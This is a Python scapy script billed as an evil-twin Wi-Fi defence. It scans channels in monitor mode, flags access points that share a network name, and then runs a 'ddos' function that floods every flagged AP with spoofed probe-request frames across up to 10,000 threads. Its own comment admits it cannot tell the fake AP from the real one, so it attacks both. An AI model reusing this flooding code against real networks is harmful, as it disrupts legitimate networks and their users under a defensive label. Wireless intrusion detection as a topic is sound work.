import time

from scapy.all import *
import os
import threading
import multiprocessing

from scapy.layers.dot11 import Dot11Beacon, Dot11, RadioTap, Dot11Deauth, Dot11ProbeReq, Dot11Elt

"""
defence module against evil twin, scan for duplicate networks and disconnect from them if found.
"""

network_dict = {}
# my_macs = [get_if_hwaddr(i) for i in get_if_list()]
my_macs = []
duplicate_aps = {}
unique_ap_names = {}
interface = ''


def sniffAP(packet):
    if packet.haslayer(Dot11Beacon):
        mac_addr = packet[Dot11].addr2
        ap_name = packet[Dot11].info.decode()
        stats = packet[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        if mac_addr not in network_dict.keys() and mac_addr not in my_macs:
            network_dict[mac_addr] = (mac_addr, ap_name, channel)
            print(f"Found AP:{network_dict[mac_addr]}")


# traverse the networks we found, and look if two of them have the same name.
def find_duplicates():
    for mac_addr in network_dict:
        ap_name = network_dict[mac_addr][1]
        if ap_name in unique_ap_names.keys():
            print(f"Duplicated network:\nMAC:{mac_addr} | Name: {ap_name}")
            duplicate_aps[
                mac_addr] = ap_name  # insert both mac addresses into networks, since we don't know which is fake.
            # this is a mac address
            duplicate_aps[unique_ap_names[ap_name]] = ap_name
        else:
            unique_ap_names[ap_name] = mac_addr
    print(duplicate_aps)


def changeChannels(timeout):
    channel = 1
    counter = 0
    while True:
        # os command to switch channels.
        os.system(f"iwconfig {interface} channel {channel}")
        channel = channel % 14 + 1
        time.sleep(2)
        print(f"scanning channel: {channel}")
        counter += 1
        if counter == timeout:
            break


def setMonitor(interface):
    os.system(f"sudo ifconfig {interface} down")
    os.system(f"sudo iwconfig {interface} mode monitor")
    os.system(f"sudo ifconfig {interface} up")


def ddos(victim, iface):
    def disconnect():
        random_mac = RandMAC()
        ddos_pkt = RadioTap() / Dot11(addr1=victim, addr2=random_mac,
                                      addr3=random_mac) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="")
        # sendp since we are working on layer 2
        sendp(ddos_pkt, iface=iface, loop=1)

    keep_alive = []
    try:
        for i in range(0, 10000):
            thread = threading.Thread(target=disconnect)
            thread.start()
            keep_alive.append(thread)
    except:
        pass


def defend(iface):
    global interface
    interface = iface
    setMonitor(interface)
    timeout = 60

    # ------- PART 1: SCAN FOR DUP   NETWORKS ---------
    channel_changer = multiprocessing.Process(target=changeChannels, args=(timeout,), daemon=True)
    channel_changer.start()
    sniff(prn=sniffAP, timeout=timeout, iface=interface)
    channel_changer.join()
    # ---------------------------------------------------
    # ------ PART 2: Attack attacker :) -------
    find_duplicates()
    if len(duplicate_aps.keys()) > 0:
        print("Found duplicate APs - attacking both APs ")
        for dup_mac in duplicate_aps.keys():
            dc_process = multiprocessing.Process(target=ddos, args=(dup_mac, interface),
                                                 daemon=True)  # start the ddos thread
            dc_process.start()
